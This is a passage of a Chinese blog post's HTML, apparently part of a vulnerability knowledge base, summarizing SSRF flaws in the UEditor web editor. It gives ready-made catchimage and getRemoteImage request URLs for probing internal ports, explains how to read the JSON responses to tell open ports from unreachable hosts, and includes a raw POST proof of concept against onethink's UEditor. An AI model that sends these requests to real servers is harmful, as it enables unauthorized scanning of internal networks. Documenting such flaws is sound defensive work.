+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://xxx/cmd/ueditor/jsp/controller.jsp?action=catchimage&amp;source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>内网端口探测：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg
+</span></span><span class="line"><span class="cl">/ueditor/jsp/controller.jsp?action=catchimage&amp;source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
+</span></span><span class="line"><span class="cl">/ueditor/php/controller.php?action=catchimage&amp;source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断该地址对应的主机端口是否开放：</p>
+<ul>
+<li>如果抓取不存在的图片地址时，页面返回如下，即state为&quot;远程连接出错&quot;。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;state&#34;: &#34;SUCCESS&#34;, list:[{&#34;state&#34;:&#34;\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519&#34;} ]}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>如果成功抓取到图片，页面返回如下，即state为&quot;SUCCESS&quot;。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;state&#34;</span><span class="p">:</span> <span class="s2">&#34;SUCCESS&#34;</span><span class="p">,</span> <span class="n">list</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&#34;state&#34;</span><span class="p">:</span><span class="s2">&#34;SUCCESS&#34;</span><span class="p">,</span><span class="s2">&#34;size&#34;</span><span class="p">:</span><span class="s2">&#34;5103&#34;</span><span class="p">,</span><span class="s2">&#34;source&#34;</span><span class="p">:</span><span class="s2">&#34;http://192.168.135.133:8080/tomcat.png&#34;</span><span class="p">,</span><span class="s2">&#34;title&#34;</span><span class="p">:</span><span class="s2">&#34;1527173588127099881.png&#34;</span><span class="p">,</span><span class="s2">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&#34;</span><span class="p">}]}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>如果主机无法访问，页面返回如下，即state为&quot;抓取远程图片失败&quot;。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;state&#34;:&#34;SUCCESS&#34;, list: [{&#34;state&#34;:&#34;\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25&#34;}]}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还有一个版本的ssrf漏洞 ，存在于onethink 1.0中的ueditor，测试版本为1.2。poc：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST http://xxx/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: xxx
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101Firefox/55.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 37
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">upfile=https://www.google.com/?%23.jpg
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" data-title="Ueditor编辑器漏洞总结" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" data-title="Ueditor编辑器漏洞总结"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" data-title="Ueditor编辑器漏洞总结"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" data-title="Ueditor编辑器漏洞总结"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/vmware-spring-security-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2022-22978/" class="prev" rel="prev" title="VMware Spring Security 身份认证绕过漏洞 CVE-2022-22978"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>VMware Spring Security 身份认证绕过漏洞 CVE-2022-22978</a>
+            <a href="/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/" class="next" rel="next" title="UCMS 文件上传漏洞 CVE-2020-25483">UCMS 文件上传漏洞 CVE-2020-25483<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
